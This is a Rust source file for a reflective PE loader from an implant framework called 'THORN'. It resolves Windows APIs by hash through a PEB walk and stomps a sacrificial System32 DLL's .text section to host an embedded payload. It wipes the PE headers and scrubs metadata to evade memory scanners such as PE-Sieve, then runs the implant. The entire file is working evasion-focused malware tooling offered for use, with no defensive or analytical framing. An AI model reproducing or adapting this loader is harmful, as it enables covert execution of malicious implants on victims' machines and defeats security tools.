// loader.rs — Reflective PE loader
//
// Called from entry.rs with rcx = blob_base (address of "THORNLDR" header).
//
// Pipeline:
//   1. Parse THORNLDR header → locate embedded PE
//   2. Walk PEB → kernel32 base
//   3. Hash-resolve: VirtualAlloc, VirtualProtect, LoadLibraryA,
//                    GetProcAddress, ExitThread, TlsAlloc, TlsSetValue
//   4. Acquire a writable region for the PE image:
//      module_stomp: LoadLibraryA a sacrificial DLL, VirtualProtect its
//                    .text RW, write PE there → MEM_IMAGE backed memory.
//                    Falls back to VirtualAlloc(RW) if .text is too small.
//      default:      VirtualAlloc(RW) private memory.
//   5. Copy PE headers + sections into allocation
//   6. Apply base relocations (DIR64 only)
//   7. Resolve import table via LoadLibraryA + GetProcAddress
//   8. VirtualProtect each section to correct permissions (no section is RWX)
//   9. Init TLS, run PE entry point in this thread
//  10. ExitThread(0) — loader thread done

use crate::api_hash::{
    get_proc_by_hash,
    FnVirtualAlloc, FnVirtualProtect, FnLoadLibraryA,
    FnGetProcAddress, FnExitThread, FnTlsAlloc, FnTlsSetValue,
    HASH_VIRTUAL_ALLOC, HASH_VIRTUAL_PROTECT, HASH_LOAD_LIBRARY_A,
    HASH_GET_PROC_ADDRESS, HASH_EXIT_THREAD, HASH_TLS_ALLOC, HASH_TLS_SET_VALUE,
};
#[cfg(feature = "module_stomp")]
use crate::api_hash::{FnLoadLibraryExA, HASH_LOAD_LIBRARY_EX_A};
use crate::peb_walk::find_kernel32;

// ── Win32 constants ───────────────────────────────────────────────────────────
const MEM_COMMIT:   u32 = 0x00001000;
const MEM_RESERVE:  u32 = 0x00002000;

const PAGE_NOACCESS:          u32 = 0x01;
const PAGE_READONLY:          u32 = 0x02;
const PAGE_READWRITE:         u32 = 0x04;
const PAGE_EXECUTE:           u32 = 0x10;
const PAGE_EXECUTE_READ:      u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

const SCN_MEM_EXECUTE: u32 = 0x2000_0000;
const SCN_MEM_READ:    u32 = 0x4000_0000;
const SCN_MEM_WRITE:   u32 = 0x8000_0000;

const IMAGE_REL_BASED_DIR64: u16 = 10;

// ── Safe byte copy (avoids any CRT memcpy call) ───────────────────────────────
#[inline(always)]
unsafe fn raw_copy(dst: *mut u8, src: *const u8, count: usize) {
    core::arch::asm!(
        "rep movsb",
        inout("rdi") dst  => _,
        inout("rsi") src  => _,
        inout("rcx") count => _,
        options(nostack),
    );
}

// ── PE header accessors (offset-based, no struct definitions) ─────────────────
//
// All offsets are for PE32+ (x64).  The loader only processes x64 PEs.

#[inline(always)]
unsafe fn pe_nt(pe: *const u8) -> *const u8 {
    let e_lfanew = (pe.add(0x3C) as *const i32).read_unaligned();
    pe.add(e_lfanew as usize)
}

/// OptionalHeader base = NT headers base + 4 (Signature) + 20 (FileHeader)
#[inline(always)]
unsafe fn pe_opt(pe: *const u8) -> *const u8 {
    pe_nt(pe).add(24)
}

pub(crate) unsafe fn pe_num_sections(pe: *const u8) -> u16 {
    // FileHeader.NumberOfSections at NT+4+2 = NT+6
    (pe_nt(pe).add(6) as *const u16).read_unaligned()
}

#[inline(always)]
unsafe fn pe_size_opt_hdr(pe: *const u8) -> u16 {
    // FileHeader.SizeOfOptionalHeader at NT+4+16 = NT+20
    (pe_nt(pe).add(20) as *const u16).read_unaligned()
}

/// Pointer to first IMAGE_SECTION_HEADER (each is 40 bytes).
pub(crate) unsafe fn pe_first_section(pe: *const u8) -> *const u8 {
    pe_nt(pe).add(4 + 20 + pe_size_opt_hdr(pe) as usize)
}

// ── Module stomp: load a sacrificial DLL, find & unlock its .text ────────────

#[cfg(feature = "module_stomp")]
/// Sacrificial DLL to load and stomp. Must exist in System32 and have a
/// .text section large enough for typical implants (~1-2 MB).
/// xpsservices.dll (~1.7 MB .text) is an XPS print/render helper —
/// never loaded by RuntimeBroker, sihost, or ctfmon under normal conditions.
const STOMP_DLL: &[u8] = b"C:\\Windows\\System32\\xpsservices.dll\0";

#[cfg(feature = "module_stomp")]
/// Load the sacrificial DLL, find its .text section, VirtualProtect it RW.
/// Uses LoadLibraryExA with DONT_RESOLVE_DLL_REFERENCES so that DllMain is
/// never called and the module is not registered for thread-attach callbacks.
/// Without this, thread creation/destruction invokes the stomped DLL's entry
/// point — which now contains implant code — crashing the process.
/// Returns (ptr_to_text_start, text_size) or (null, 0) on failure.
unsafe fn load_and_unlock_stomp_target(
    lla_ex: FnLoadLibraryExA,
    vp:     FnVirtualProtect,
    required_size: usize,
) -> (*mut u8, usize) {
    const DONT_RESOLVE_DLL_REFERENCES: u32 = 0x1;
    let base = lla_ex(STOMP_DLL.as_ptr(), core::ptr::null_mut(), DONT_RESOLVE_DLL_REFERENCES);
    if base.is_null() {
        return (core::ptr::null_mut(), 0);
    }

    // Walk sections to find .text
    let num_sec = pe_num_sections(base);
    let first   = pe_first_section(base);

    let mut i = 0u16;
    while i < num_sec {
        let sec   = first.add(i as usize * 40);
        let chars = (sec.add(36) as *const u32).read_unaligned();

        if (chars & SCN_MEM_EXECUTE) != 0 && (chars & SCN_MEM_READ) != 0 {
            let virt_size = (sec.add(8)  as *const u32).read_unaligned() as usize;
            let virt_rva  = (sec.add(12) as *const u32).read_unaligned() as usize;

            if virt_size >= required_size {
                let target = base.add(virt_rva) as *mut u8;
                let mut old_prot: u32 = 0;
                if (vp)(target, required_size, PAGE_READWRITE, &mut old_prot) != 0 {
                    return (target, virt_size);
                }
            }
            // Only try the first RX section
            break;
        }
        i += 1;
    }

    (core::ptr::null_mut(), 0)
}


// ── Main loader function ──────────────────────────────────────────────────────

#[no_mangle]
pub unsafe extern "C" fn loader_main(blob_base: *const u8) {
    // ── Step 1: Parse THORNLDR header ─────────────────────────────────────────
    // Header layout: magic[8] | pe_offset u32 | pe_size u32
    let pe_offset = (blob_base.add(8) as *const u32).read_unaligned() as usize;
    let pe        = blob_base.add(pe_offset);

    // Validate MZ magic
    if (pe as *const u16).read_unaligned() != 0x5A4D { return; }

    // ── Step 2: Resolve APIs ──────────────────────────────────────────────────
    let k32 = find_kernel32();
    if k32.is_null() { return; }

    let va  = core::mem::transmute::<_, FnVirtualAlloc  >(get_proc_by_hash(k32, HASH_VIRTUAL_ALLOC));
    let vp  = core::mem::transmute::<_, FnVirtualProtect>(get_proc_by_hash(k32, HASH_VIRTUAL_PROTECT));
    let lla = core::mem::transmute::<_, FnLoadLibraryA  >(get_proc_by_hash(k32, HASH_LOAD_LIBRARY_A));
    let gpa = core::mem::transmute::<_, FnGetProcAddress>(get_proc_by_hash(k32, HASH_GET_PROC_ADDRESS));
    let et  = core::mem::transmute::<_, FnExitThread    >(get_proc_by_hash(k32, HASH_EXIT_THREAD));
    let ta  = core::mem::transmute::<_, FnTlsAlloc      >(get_proc_by_hash(k32, HASH_TLS_ALLOC));
    let tsv = core::mem::transmute::<_, FnTlsSetValue   >(get_proc_by_hash(k32, HASH_TLS_SET_VALUE));
    #[cfg(feature = "module_stomp")]
    let lla_ex = core::mem::transmute::<_, FnLoadLibraryExA>(get_proc_by_hash(k32, HASH_LOAD_LIBRARY_EX_A));

    if (va  as usize) == 0 || (vp  as usize) == 0 || (lla as usize) == 0
    || (gpa as usize) == 0 || (ta  as usize) == 0 || (tsv as usize) == 0
    { return; }
    #[cfg(feature = "module_stomp")]
    if (lla_ex as usize) == 0 { return; }

    // ── Step 3: Parse key PE fields ───────────────────────────────────────────
    let opt               = pe_opt(pe);
    let image_base_pref   = (opt.add(24) as *const u64).read_unaligned();  // ImageBase
    let size_of_image     = (opt.add(56) as *const u32).read_unaligned() as usize; // SizeOfImage
    let size_of_headers   = (opt.add(60) as *const u32).read_unaligned() as usize; // SizeOfHeaders
    let entry_rva         = (opt.add(16) as *const u32).read_unaligned() as usize; // AddressOfEntryPoint
    let num_sections      = pe_num_sections(pe) as usize;
    let first_section     = pe_first_section(pe);

    // ── Step 4: Acquire a writable image region ───────────────────────────────
    #[cfg(not(feature = "module_stomp"))]
    let alloc: *mut u8 = va(core::ptr::null_mut(), size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    #[cfg(feature = "module_stomp")]
    let alloc: *mut u8 = {
        let (stomped, _) = load_and_unlock_stomp_target(lla_ex, vp, size_of_image);
        if !stomped.is_null() {
            stomped
        } else {
            // Fallback to private allocation
            va(core::ptr::null_mut(), size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        }
    };

    if alloc.is_null() { return; }

    // ── Step 4b (module_stomp): Zero the region ──────────────────────────────
    // VirtualAlloc returns zeroed pages, but a stomped DLL section contains
    // residual code.  BSS areas (VirtualSize > SizeOfRawData) and gaps between
    // sections must be zero or static variables that default to 0 read garbage,
    // silently corrupting implant state.
    #[cfg(feature = "module_stomp")]
    {
        core::arch::asm!(
            "xor eax, eax",
            "rep stosb",
            inout("rdi") alloc => _,
            inout("rcx") size_of_image => _,
            out("eax") _,
            options(nostack),
        );
    }

    // ── Step 5a: Copy PE headers ──────────────────────────────────────────────
    raw_copy(alloc, pe, size_of_headers);

    // ── Step 5b: Copy sections ────────────────────────────────────────────────
    // Each IMAGE_SECTION_HEADER is 40 bytes:
    //   +8  VirtualSize     u32
    //   +12 VirtualAddress  u32
    //   +16 SizeOfRawData   u32
    //   +20 PointerToRawData u32
    let mut i = 0;
    while i < num_sections {
        let sec      = first_section.add(i * 40);
        let virt_va  = (sec.add(12) as *const u32).read_unaligned() as usize;
        let raw_size = (sec.add(16) as *const u32).read_unaligned() as usize;
        let raw_off  = (sec.add(20) as *const u32).read_unaligned() as usize;

        if raw_size > 0 && raw_off > 0 {
            raw_copy(alloc.add(virt_va), pe.add(raw_off), raw_size);
        }
        i += 1;
    }

    // ── Step 6: Apply base relocations ────────────────────────────────────────
    let delta = alloc as i64 - image_base_pref as i64;
    if delta != 0 {
        apply_relocations(alloc, opt, delta);
    }

    // ── Step 7: Resolve imports ───────────────────────────────────────────────
    resolve_imports(alloc, opt, lla, gpa);

    // ── Step 7b: Scrub consumed PE metadata ────────────────────────────────
    // Zero data directories that live in their own sections and are no
    // longer needed.  Only safe targets — relocations (.reloc) and debug
    // (.debug) — are scrubbed.  The import directory is NOT zeroed because
    // it shares .rdata with string literals and other const data the
    // implant needs at runtime.
    scrub_safe_directories(alloc, opt, vp);

    // ── Step 8: Set section permissions ──────────────────────────────────────
    set_section_permissions(alloc, first_section, num_sections, vp);

    // ── Wipe PE headers from stomped region ──────────────────────────────────
    // Headers are no longer needed. Zeroing them removes the MZ/PE signature
    // that PE-Sieve uses to detect implanted PE modules in the host DLL.
    {
        core::arch::asm!(
            "xor eax, eax",
            "rep stosb",
            inout("rdi") alloc => _,
            inout("rcx") size_of_headers => _,
            out("eax") _,
            options(nostack),
        );
    }

    // ── Stash blob info in wiped header area for implant-side cleanup ───────
    // Layout at alloc[0..24]:
    //   [0..8]   magic  "THORNBLB"
    //   [8..16]  blob_base  u64
    //   [16..24] blob_total u64  (pe_offset + pe_size)
    //
    // The implant reads this at startup, VirtualProtects the blob to RW,
    // zeros it, then VirtualFrees it — eliminating RX private memory and
    // PE signatures from scanners.
    {
        let pe_size   = (blob_base.add(12) as *const u32).read_unaligned() as usize;
        let blob_total = pe_offset + pe_size;
        let info = alloc as *mut u8;
        // Write magic "THORNBLB"
        raw_copy(info, b"THORNBLB".as_ptr(), 8);
        (info.add(8)  as *mut u64).write_unaligned(blob_base as u64);
        (info.add(16) as *mut u64).write_unaligned(blob_total as u64);
    }

    // ── Step 9: Initialise TLS, then run PE entry point in this thread ───────
    init_tls(alloc, opt, va, ta, tsv);

    // ── Step 10: Call OEP ──────────────────────────────────────────────────
    let oep: unsafe extern "system" fn(*mut u8) -> u32 =
        core::mem::transmute(alloc.add(entry_rva));

    oep(core::ptr::null_mut());

    // ── Step 11: Exit this loader thread cleanly ─────────────────────────
    if (et as usize) != 0 {
        et(0);
    }
    loop { core::arch::asm!("pause", options(nostack, nomem)); }
}

// ── Base relocation fixup ─────────────────────────────────────────────────────
unsafe fn apply_relocations(alloc: *mut u8, opt: *const u8, delta: i64) {
    // DataDirectory[5] = Base Relocation Directory
    // DataDirectory starts at OptionalHeader + 112; each entry is 8 bytes.
    let reloc_rva  = (opt.add(112 + 5 * 8)     as *const u32).read_unaligned();
    let reloc_size = (opt.add(112 + 5 * 8 + 4) as *const u32).read_unaligned();

    if reloc_rva == 0 || reloc_size == 0 { return; }

    let mut block     = alloc.add(reloc_rva  as usize);
    let     reloc_end = alloc.add(reloc_rva  as usize + reloc_size as usize);

    while block < reloc_end {
        // IMAGE_BASE_RELOCATION: VirtualAddress u32 | SizeOfBlock u32
        let page_rva   = (block         as *const u32).read_unaligned() as usize;
        let block_size = (block.add(4)  as *const u32).read_unaligned() as usize;
        if block_size < 8 { break; }

        let num_entries = (block_size - 8) / 2;
        let mut j = 0;
        while j < num_entries {
            let entry      = (block.add(8 + j * 2) as *const u16).read_unaligned();
            let reloc_type = entry >> 12;
            let reloc_off  = (entry & 0x0FFF) as usize;

            if reloc_type == IMAGE_REL_BASED_DIR64 {
                let target = alloc.add(page_rva + reloc_off) as *mut i64;
                let val    = target.read_unaligned();
                target.write_unaligned(val.wrapping_add(delta));
            }
            // type 0 = padding, skip
            j += 1;
        }
        block = block.add(block_size);
    }
}

// ── Import resolution ─────────────────────────────────────────────────────────
unsafe fn resolve_imports(
    alloc:  *mut  u8,
    opt:    *const u8,
    lla:    FnLoadLibraryA,
    gpa:    FnGetProcAddress,
) {
    // DataDirectory[1] = Import Directory
    let import_rva = (opt.add(112 + 1 * 8) as *const u32).read_unaligned();
    if import_rva == 0 { return; }

    // Walk IMAGE_IMPORT_DESCRIPTORs (20 bytes each):
    //   +0  OriginalFirstThunk u32  (INT RVA)
    //   +12 Name               u32  (DLL name RVA)
    //   +16 FirstThunk         u32  (IAT RVA)
    let mut desc = alloc.add(import_rva as usize);

    loop {
        let name_rva = (desc.add(12) as *const u32).read_unaligned();
        if name_rva == 0 { break; }  // null-terminator descriptor

        let dll_name = alloc.add(name_rva as usize);
        let hmod     = lla(dll_name);
        // Continue even if LoadLibraryA fails — some API set DLLs may already be loaded.

        let orig_thunk_rva = (desc         as *const u32).read_unaligned();
        let iat_rva        = (desc.add(16) as *const u32).read_unaligned();

        // Prefer INT (OriginalFirstThunk); fall back to IAT if absent.
        let int_rva = if orig_thunk_rva != 0 { orig_thunk_rva } else { iat_rva };

        let mut k = 0usize;
        loop {
            let thunk = (alloc.add(int_rva as usize + k * 8) as *const u64).read_unaligned();
            if thunk == 0 { break; }

            let resolved = if thunk >> 63 != 0 {
                // Import by ordinal: lower 16 bits = ordinal
                let ordinal = (thunk & 0xFFFF) as u16;
                gpa(hmod, ordinal as usize as *const u8)
            } else {
                // Import by name: IMAGE_IMPORT_BY_NAME at thunk-as-RVA
                // Skip 2-byte Hint field, then null-terminated name follows.
                let ibn_rva = (thunk & 0x7FFF_FFFF_FFFF_FFFF) as usize;
                let name    = alloc.add(ibn_rva + 2);  // +2 = skip Hint
                gpa(hmod, name)
            };

            // Write resolved address into IAT slot
            (alloc.add(iat_rva as usize + k * 8) as *mut u64)
                .write_unaligned(resolved as u64);

            k += 1;
        }

        desc = desc.add(20);
    }
}

// ── Scrub safe data directories ──────────────────────────────────────────────
//
// Zero data directories that occupy their own dedicated sections and are no
// longer needed after loading:
//   5 = Base Relocation Table  (.reloc section — never accessed at runtime)
//   6 = Debug Directory        (small, isolated debug pointers)
//
// The import directory (1) is NOT zeroed — it shares .rdata with string
// literals, vtables, and other const data the implant needs at runtime.
unsafe fn scrub_safe_directories(
    alloc: *mut u8,
    opt:   *const u8,
    vp:    FnVirtualProtect,
) {
    let indices: [usize; 2] = [5, 6];
    for &idx in &indices {
        let dd_off = 112 + idx * 8;
        let rva  = (opt.add(dd_off)     as *const u32).read_unaligned() as usize;
        let size = (opt.add(dd_off + 4) as *const u32).read_unaligned() as usize;

        if rva == 0 || size == 0 { continue; }

        let region = alloc.add(rva) as *mut u8;

        let mut old_prot: u32 = 0;
        vp(region, size, PAGE_READWRITE, &mut old_prot);

        core::arch::asm!(
            "xor eax, eax",
            "rep stosb",
            inout("rdi") region => _,
            inout("rcx") size => _,
            out("eax") _,
            options(nostack),
        );

        let mut tmp: u32 = 0;
        vp(alloc.add(rva) as *mut u8, size, old_prot, &mut tmp);
    }
}

// ── Per-section protection ────────────────────────────────────────────────────
unsafe fn set_section_permissions(
    alloc:         *mut u8,
    first_section: *const u8,
    num_sections:  usize,
    vp:            FnVirtualProtect,
) {
    let mut i = 0;
    while i < num_sections {
        let sec       = first_section.add(i * 40);
        let virt_size = (sec.add(8)  as *const u32).read_unaligned() as usize;
        let virt_va   = (sec.add(12) as *const u32).read_unaligned() as usize;
        let chars     = (sec.add(36) as *const u32).read_unaligned();

        if virt_size == 0 { i += 1; continue; }

        let exec  = chars & SCN_MEM_EXECUTE != 0;
        let read  = chars & SCN_MEM_READ    != 0;
        let write = chars & SCN_MEM_WRITE   != 0;

        let prot = match (exec, read, write) {
            (true,  true,  true)  => PAGE_EXECUTE_READWRITE,   // shouldn't exist
            (true,  true,  false) => PAGE_EXECUTE_READ,         // .text — most common
            (true,  false, _)     => PAGE_EXECUTE,
            (false, true,  true)  => PAGE_READWRITE,            // .data
            (false, true,  false) => PAGE_READONLY,             // .rdata, .pdata
            _                     => PAGE_NOACCESS,
        };

        let mut old_prot: u32 = 0;
        vp(alloc.add(virt_va), virt_size, prot, &mut old_prot);

        i += 1;
    }
}

// ── TLS initialisation ────────────────────────────────────────────────────────
//
// Replicates what the OS PE loader does with IMAGE_TLS_DIRECTORY64 before
// calling the entry point:
//   1. TlsAlloc() → slot index
//   2. Write slot index to *AddressOfIndex  (in the loaded image)
//   3. Allocate per-thread TLS data buffer, copy TLS template bytes into it
//   4. TlsSetValue(slot, buffer)  — register buffer for the current thread
//   5. Call each TLS callback with (alloc, DLL_PROCESS_ATTACH, NULL)
//
// Must run in the same thread that will execute the PE entry point.
unsafe fn init_tls(
    alloc: *mut  u8,
    opt:   *const u8,
    va:    FnVirtualAlloc,
    ta:    FnTlsAlloc,
    tsv:   FnTlsSetValue,
) {
    // DataDirectory[9] = TLS directory
    let tls_rva  = (opt.add(112 + 9 * 8)     as *const u32).read_unaligned();
    let tls_size = (opt.add(112 + 9 * 8 + 4) as *const u32).read_unaligned();
    if tls_rva == 0 || tls_size == 0 { return; }

    // IMAGE_TLS_DIRECTORY64 layout (all VA fields are already relocated):
    //   +0   StartAddressOfRawData  u64  — start of TLS template data
    //   +8   EndAddressOfRawData    u64  — end of TLS template data
    //   +16  AddressOfIndex         u64  — VA of the TLS slot-index DWORD
    //   +24  AddressOfCallBacks     u64  — VA of null-terminated callback array
    //   +32  SizeOfZeroFill         u32
    //   +36  Characteristics        u32
    let tls_dir   = alloc.add(tls_rva as usize);
    let raw_start = (tls_dir.add( 0) as *const u64).read_unaligned();
    let raw_end   = (tls_dir.add( 8) as *const u64).read_unaligned();
    let addr_idx  = (tls_dir.add(16) as *const u64).read_unaligned();
    let addr_cbs  = (tls_dir.add(24) as *const u64).read_unaligned();
    let zero_fill = (tls_dir.add(32) as *const u32).read_unaligned();

    // Allocate a TLS slot and publish the index into the PE's index pointer.
    let slot = ta();
    const TLS_OUT_OF_INDEXES: u32 = 0xFFFF_FFFF;
    if slot == TLS_OUT_OF_INDEXES { return; }
    if addr_idx != 0 {
        (addr_idx as *mut u32).write_unaligned(slot);
    }

    // Build the per-thread TLS data buffer (template + zero-fill).
    let raw_size = raw_end.wrapping_sub(raw_start) as usize;
    let buf_size = raw_size + zero_fill as usize;
    if buf_size > 0 {
        let tls_buf = va(
            core::ptr::null_mut(), buf_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
        );
        if !tls_buf.is_null() {
            if raw_size > 0 {
                raw_copy(tls_buf, raw_start as *const u8, raw_size);
            }
            // Bytes beyond raw_size are already zeroed by VirtualAlloc.
            tsv(slot, tls_buf);
        }
    }

    // Call TLS callbacks with DLL_PROCESS_ATTACH (reason = 1).
    if addr_cbs != 0 {
        let mut cb_ptr = addr_cbs as *const u64;
        loop {
            let cb_va = cb_ptr.read_unaligned();
            if cb_va == 0 { break; }
            let cb: unsafe extern "system" fn(*mut u8, u32, *mut u8) =
                core::mem::transmute(cb_va);
            cb(alloc, 1 /* DLL_PROCESS_ATTACH */, core::ptr::null_mut());
            cb_ptr = cb_ptr.add(1);
        }
    }
}
